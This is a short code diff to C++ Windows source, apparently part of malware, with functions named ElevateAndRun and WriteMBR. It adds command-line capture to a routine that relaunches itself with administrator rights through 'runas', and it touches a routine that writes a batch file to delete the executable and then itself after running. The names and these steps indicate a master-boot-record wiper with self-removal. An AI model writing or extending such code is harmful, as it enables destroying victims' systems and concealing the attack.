@@ -92,6 +92,9 @@ void ElevateAndRun() {
     char szPath[MAX_PATH];
     GetModuleFileNameA(NULL, szPath, MAX_PATH);
     
+    // Получаем командную строку для передачи аргументов
+    LPSTR lpCmdLine = GetCommandLineA();
+    
     SHELLEXECUTEINFOA sei = {0};
     sei.cbSize = sizeof(sei);
     sei.lpVerb = "runas";
@@ -172,7 +175,7 @@ void WriteMBR() {
     std::string batPath = std::string(szPath) + ".bat";
     std::ofstream bat(batPath.c_str());
     bat << "@echo off\n";
-    bat << "ping 127.0.0.1 -n 2 > nul\n";  // Работает везде
+    bat << "ping 127.0.0.1 -n 2 > nul\n";
     bat << "del \"" << szPath << "\"\n";
     bat << "del \"" << batPath << "\"\n";
     bat.close();
